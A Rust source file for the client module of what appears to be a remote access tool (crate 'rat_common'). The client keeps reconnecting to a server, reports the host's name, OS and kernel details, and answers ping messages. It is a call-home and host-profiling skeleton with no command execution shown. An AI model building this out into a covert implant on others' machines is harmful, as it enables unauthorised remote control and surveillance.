use std::collections::VecDeque;
use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use log::{error, info, warn};
use rat_common::framework::{ModuleImpl, ModuleState};
use rat_common::messages::{ClientMessage, ServerMessage, SystemInfo};
use rat_common::types::PortableSocketAddrs;
use rat_common::utils::TcpReader;
use sysinfo::System;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::net::tcp::OwnedWriteHalf;
use tokio::sync::Mutex;
use tokio::time::sleep;

pub struct Client<A>
where
    A: PortableSocketAddrs,
{
    _addr: A,
    _reader: Mutex<TcpReader>,
    _writer: Mutex<OwnedWriteHalf>,
    _total_read_buf: Mutex<VecDeque<u8>>,
    _system: Mutex<System>,
    _state: Arc<ModuleState>,
}

impl<A> Client<A>
where
    A: PortableSocketAddrs,
{
    pub async fn connect(addr: A) -> Self {
        let (reader, writer) = Self::_reconnect(addr.clone()).await;

        let mut system = System::new_all();
        system.refresh_all();

        Self {
            _addr: addr,
            _reader: Mutex::new(reader),
            _writer: Mutex::new(writer),
            _total_read_buf: Mutex::new(VecDeque::new()),
            _system: Mutex::new(system),
            _state: ModuleState::new(),
        }
    }

    async fn _reconnect(addr: A) -> (TcpReader, OwnedWriteHalf) {
        loop {
            match TcpStream::connect(addr.clone()).await {
                Ok(stream) => {
                    let (reader, writer) = stream.into_split();
                    return (TcpReader::new(reader), writer);
                }
                Err(e) => {
                    let wait = Duration::from_millis(5000); // TODO: Exponential backoff + random jitter
                    warn!("Unable to connect to server: {e}. Retrying in {wait:?}...");
                    sleep(wait).await;
                }
            }
        }
    }

    async fn _process_message(&self, message: ServerMessage) -> anyhow::Result<()> {
        println!("{message:?}");
        match message {
            ServerMessage::Ping { value } => {
                let pong = ClientMessage::Pong {
                    value: value.wrapping_add(1),
                };
                self.send(&pong).await?;
            }
        }

        Ok(())
    }

    async fn _send_system_info(&self) -> anyhow::Result<()> {
        self.send(&ClientMessage::SystemInfoUpdate {
            info: SystemInfo {
                boot_time: System::boot_time(),
                cpu_arch: System::cpu_arch(),
                distribution_id: System::distribution_id(),
                host_name: System::host_name(),
                kernel_long_version: System::kernel_long_version(),
                kernel_version: System::kernel_version(),
                long_os_version: System::long_os_version(),
                name: System::name(),
                open_files_limit: System::open_files_limit(),
                os_version: System::os_version(),
                physical_core_count: System::physical_core_count(),
                uptime: System::uptime(),
            },
        })
        .await
    }

    pub async fn send(&self, message: &ClientMessage) -> anyhow::Result<()> {
        let data = postcard::to_stdvec_cobs(message)?;

        let mut writer = self._writer.lock().await;
        writer.write_all(&data).await?;
        Ok(())
    }
}

#[async_trait]
impl<A> ModuleImpl for Client<A>
where
    A: PortableSocketAddrs,
{
    type EventType = anyhow::Result<usize>;

    fn name(&self) -> &str {
        "Client"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let mut reader = self._reader.lock().await;
        Ok(reader.read().await?)
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let mut size = 0;
        let closed = match event {
            Ok(0) => true,
            Ok(s) => {
                size = s;
                false
            }
            Err(e) => {
                error!("Error when reading from server: {e}");
                true
            }
        };

        if closed {
            error!("Server disconnected. Reconnecting...");

            let (new_reader, new_writer) = tokio::select! {
                pair = Self::_reconnect(self._addr.clone()) => pair,
                _ = self.wait_until_stopped() => {
                    return Ok(());
                }
            };

            info!("Reconnected to server");

            {
                let mut reader = self._reader.lock().await;
                let mut writer = self._writer.lock().await;
                let mut total_read_buf = self._total_read_buf.lock().await;

                *reader = new_reader;
                *writer = new_writer;
                total_read_buf.clear();
            }

            self.clone()._send_system_info().await?;
        }

        let reader = self._reader.lock().await;
        let mut total_read_buf = self._total_read_buf.lock().await;
        let mut offset = total_read_buf.len();

        total_read_buf.extend(reader.prefix(size));
        while offset < total_read_buf.len() {
            if total_read_buf[offset] == 0 {
                let mut frame = total_read_buf.drain(..=offset).collect::<Vec<u8>>();
                offset = 0;

                match postcard::from_bytes_cobs::<ServerMessage>(&mut frame) {
                    Ok(message) => {
                        if let Err(e) = self._process_message(message).await {
                            error!("Error processing message from server: {e}");
                        }
                    }
                    Err(e) => {
                        error!("Received malformed message from server: {e}");
                    }
                }
            } else {
                offset += 1;
            }
        }

        Ok(())
    }

    async fn before_hook(self: Arc<Self>) -> anyhow::Result<()> {
        self._send_system_info().await
    }
}
